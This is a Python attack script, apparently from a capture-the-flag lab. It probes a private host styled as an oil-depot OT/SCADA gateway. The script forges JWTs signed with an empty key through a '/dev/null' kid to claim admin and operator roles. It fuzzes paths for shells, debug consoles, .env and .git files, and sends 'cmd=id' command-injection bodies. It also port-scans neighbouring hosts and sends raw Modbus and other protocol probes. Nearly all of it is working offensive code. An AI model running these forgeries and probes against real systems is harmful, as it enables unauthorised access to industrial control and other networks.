#!/usr/bin/env python3
"""round64 — Deep exploration of newly discovered port 9001 on .102"""
import requests, json, time, hashlib, hmac as hm, base64, socket

HOST = "192.168.242.102"
BASE = f"http://{HOST}:9001"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}
AUTH_CR = {"Authorization": f"Bearer {jwt_forged('carrier')}"}
AUTH_ADMIN = {"Authorization": f"Bearer {jwt_forged('admin')}"}
AUTH_PROBE = {"Authorization": f"Bearer {jwt_forged('probe')}"}

# ============================================================
print("="*70)
print("PHASE 1: ENDPOINT DISCOVERY ON PORT 9001")
print("="*70)

# Note: port 9000 only has /healthz with 200 "ok"
# Port 9001 has a DIFFERENT 404 page (Flask default, not custom)

paths = [
    # Health/status
    "/", "/healthz", "/health", "/status", "/ready", "/alive",
    "/ping", "/version", "/info",
    # API paths
    "/api", "/api/", "/api/v1", "/api/v1/",
    "/api/ops", "/api/ops/", "/api/ops/probe", "/api/ops/probe/sign",
    "/api/ops/custody", "/api/ops/custody/ingest",
    "/api/auth", "/api/auth/me", "/api/auth/login",
    # Gauge/meter paths (gauge-gw?)
    "/v1", "/v1/", "/v1/meters", "/v1/tanks",
    "/v1/meters/loading-arm-1/flow",
    "/v1/tanks/1/level", "/v1/tanks/2/level",
    "/v1/tanks/3/level", "/v1/tanks/7/level",
    "/meters", "/tanks", "/gauges", "/sensors",
    "/gauge", "/meter", "/tank", "/flow", "/level",
    # Probe/secret related
    "/probe", "/secret", "/config", "/env", "/environ",
    "/probe/sign", "/probe/secret", "/probe_secret",
    "/sign", "/verify", "/validate",
    # Admin/debug
    "/admin", "/debug", "/console", "/shell",
    "/metrics", "/prometheus", "/grafana",
    "/swagger", "/openapi", "/docs", "/redoc",
    "/swagger.json", "/openapi.json",
    # Flask-specific
    "/static", "/static/", "/favicon.ico",
    "/.env", "/config.py", "/app.py",
    # SCADA/OT specific
    "/scada", "/hmi", "/plc", "/modbus",
    "/opc", "/opcua", "/mqtt",
    "/devices", "/device", "/register", "/registers",
    # Llehs challenge?
    "/llehs", "/shell", "/llehs/", "/challenge",
    "/flag", "/flags", "/ctf",
    # Port 9000-style
    "/ws", "/websocket", "/socket",
    # Reverse of "shell" = "llehs"
    "/llehs", "/LLEHS",
]

found = []
for path in paths:
    try:
        r = S.get(f"{BASE}{path}", timeout=3, allow_redirects=False)
        if r.status_code != 404:
            found.append((path, r.status_code, r.text[:200]))
            print(f"  [{r.status_code}] GET {path}: {r.text[:150]}")
    except Exception as e:
        print(f"  ERROR GET {path}: {e}")

print(f"\n  Found {len(found)} non-404 endpoints")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: AUTHENTICATED REQUESTS ON FOUND ENDPOINTS")
print("="*70)

for path, code, _ in found:
    for role_name, headers in [("operator", AUTH_OP), ("carrier", AUTH_CR),
                                ("admin", AUTH_ADMIN), ("probe", AUTH_PROBE)]:
        try:
            r = S.get(f"{BASE}{path}", headers=headers, timeout=3)
            if r.status_code != code:  # Different response with auth
                print(f"  [{r.status_code}] GET {path} as {role_name}: {r.text[:200]}")
        except:
            pass

# Also try auth on key paths even if they were 404 without auth
key_paths = ["/", "/api", "/api/v1", "/v1", "/probe", "/shell",
             "/admin", "/config", "/env", "/flag", "/llehs",
             "/v1/meters/loading-arm-1/flow", "/v1/tanks/1/level",
             "/api/ops/probe", "/api/ops/probe/sign"]
for path in key_paths:
    for role_name, headers in [("operator", AUTH_OP), ("carrier", AUTH_CR),
                                ("admin", AUTH_ADMIN)]:
        try:
            r = S.get(f"{BASE}{path}", headers=headers, timeout=3)
            if r.status_code != 404:
                print(f"  [{r.status_code}] GET {path} as {role_name}: {r.text[:200]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: POST/PUT/DELETE ON DISCOVERED ENDPOINTS")
print("="*70)

for path, code, _ in found:
    for method in ["POST", "PUT", "DELETE", "PATCH", "OPTIONS"]:
        try:
            r = S.request(method, f"{BASE}{path}", timeout=3,
                         headers={"Content-Type": "application/json"},
                         data='{}')
            if r.status_code not in [404, 405]:
                print(f"  [{r.status_code}] {method} {path}: {r.text[:200]}")
        except:
            pass

# Try POST on all paths
for path in key_paths:
    for ct, data in [("application/json", '{"cmd":"id"}'),
                     ("application/xml", '<x>test</x>'),
                     ("text/plain", "test"),
                     ("application/x-www-form-urlencoded", "cmd=id")]:
        try:
            r = S.post(f"{BASE}{path}", timeout=3,
                      headers={**AUTH_OP, "Content-Type": ct}, data=data)
            if r.status_code not in [404, 405]:
                print(f"  [{r.status_code}] POST {path} ({ct}): {r.text[:200]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: PORT 9001 AS GAUGE-GW PROXY?")
print("="*70)

# If port 9001 is gauge-gw exposed, try the exact URLs from probe data
gauge_urls = [
    "/v1/meters/loading-arm-1/flow",
    "/v1/tanks/1/level",
    "/v1/tanks/2/level",
    "/v1/tanks/3/level",
    "/v1/tanks/7/level",
]

for url in gauge_urls:
    try:
        r = S.get(f"{BASE}{url}", timeout=3)
        print(f"  [{r.status_code}] {url}: {r.text[:200]}")
    except Exception as e:
        print(f"  ERROR {url}: {e}")

# Try with Host header tricks
for host_val in ["gauge-gw.internal", "gauge-gw.internal:9100",
                 "gauge-gw", "localhost", "127.0.0.1"]:
    try:
        r = S.get(f"{BASE}/v1/meters/loading-arm-1/flow",
                 headers={"Host": host_val}, timeout=3)
        if r.status_code != 404:
            print(f"  [{r.status_code}] Host={host_val}: {r.text[:200]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: SCAN PORT 9001 ON ALL HOSTS")
print("="*70)

hosts = ["192.168.242.101", "192.168.242.103", "192.168.242.104",
         "192.168.242.106"]

for h in hosts:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((h, 9001))
        if result == 0:
            print(f"  OPEN: {h}:9001")
            try:
                r = requests.get(f"http://{h}:9001/", timeout=3)
                print(f"    [{r.status_code}] {r.text[:150]}")
                r = requests.get(f"http://{h}:9001/healthz", timeout=3)
                print(f"    /healthz [{r.status_code}] {r.text[:150]}")
            except:
                pass
        else:
            print(f"  CLOSED: {h}:9001")
        sock.close()
    except:
        print(f"  TIMEOUT: {h}:9001")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: DEEP ENDPOINT FUZZING ON 9001")
print("="*70)

# More exhaustive path list — trying SCADA/OT/CTF specific
deep_paths = [
    # Reversed words (LLEHS = SHELL reversed)
    "/llehs", "/LLEHS", "/Llehs",
    "/llEHS", "/LLEhs",
    # Shell-related
    "/shell", "/sh", "/bash", "/cmd", "/exec", "/run",
    "/terminal", "/term", "/pty", "/tty",
    "/command", "/execute", "/eval",
    # Werkzeug
    "/console", "/debugger",
    # Flask routes
    "/site-map", "/routes", "/endpoints",
    # Internal
    "/internal", "/private", "/_internal",
    "/_debug", "/_health", "/_status",
    "/_api", "/__api",
    # Supervisor
    "/supervisor", "/supervisord",
    # System
    "/system", "/sys", "/proc",
    "/logs", "/log", "/error",
    # OT/ICS
    "/ot", "/ics", "/dcs", "/rtu",
    "/historian", "/tag", "/tags",
    "/point", "/points", "/data",
    "/process", "/alarm", "/alarms",
    "/trend", "/trends",
    # Oil/gas specific
    "/depot", "/oil", "/fuel", "/loading",
    "/pipeline", "/pipe", "/valve",
    "/pump", "/compressor",
    "/custody", "/transfer", "/ticket",
    # API versions
    "/api/v2", "/api/v2/",
    "/v2", "/v2/",
    # gRPC / protobuf
    "/grpc", "/proto",
    # Prometheus/metrics
    "/metrics/", "/-/healthy", "/-/ready",
    # Random CTF
    "/robots.txt", "/sitemap.xml",
    "/.git", "/.git/HEAD", "/.git/config",
    "/.well-known/", "/.well-known/security.txt",
    "/backup", "/dump", "/export",
    "/secret", "/secrets", "/key", "/keys",
    "/token", "/tokens",
    # Numeric/API
    "/1", "/0", "/test", "/hello",
    "/index", "/index.html", "/index.php",
    "/login", "/register", "/signup",
    "/portal", "/dashboard",
    # Reverse proxy indicators
    "/server-status", "/server-info",
    "/nginx-status", "/stub_status",
]

for path in deep_paths:
    try:
        r = S.get(f"{BASE}{path}", timeout=2, allow_redirects=False)
        if r.status_code != 404:
            print(f"  [{r.status_code}] GET {path}: {r.text[:200]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: RAW TCP BANNER / PROTOCOL DETECTION")
print("="*70)

# Maybe it's not HTTP at all on some path
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((HOST, 9001))
    # Send nothing, wait for banner
    try:
        sock.settimeout(2)
        banner = sock.recv(1024)
        print(f"  Banner (passive): {banner!r}")
    except socket.timeout:
        print("  No passive banner (HTTP-style, waits for request)")
    sock.close()
except Exception as e:
    print(f"  Raw TCP error: {e}")

# Try various protocols
protos = [
    ("HTTP/1.1", b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"),
    ("HTTP/1.0", b"GET / HTTP/1.0\r\n\r\n"),
    ("Raw GET", b"GET /\n"),
    ("Modbus", b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01"),
    ("Redis PING", b"PING\r\n"),
    ("MySQL", b"\x00"),
]

for name, payload in protos:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((HOST, 9001))
        sock.send(payload)
        resp = sock.recv(2048)
        print(f"  {name}: {resp[:300]!r}")
        sock.close()
    except Exception as e:
        print(f"  {name}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: ALSO CHECK PORT 9002-9010 ON .102")
print("="*70)

for port in range(9002, 9011):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((HOST, port))
        if result == 0:
            print(f"  OPEN: {HOST}:{port}")
            try:
                r = requests.get(f"http://{HOST}:{port}/", timeout=2)
                print(f"    [{r.status_code}] {r.text[:150]}")
            except:
                pass
        sock.close()
    except:
        pass

# Also check 80, 443, 8000, 8001, 8008, 8080, 8443 that might have been missed
for port in [80, 443, 8000, 8001, 8008, 8080, 8443, 8888, 9999, 10000]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((HOST, port))
        if result == 0:
            print(f"  OPEN: {HOST}:{port}")
            try:
                r = requests.get(f"http://{HOST}:{port}/", timeout=2)
                print(f"    [{r.status_code}] {r.text[:150]}")
            except:
                pass
        sock.close()
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
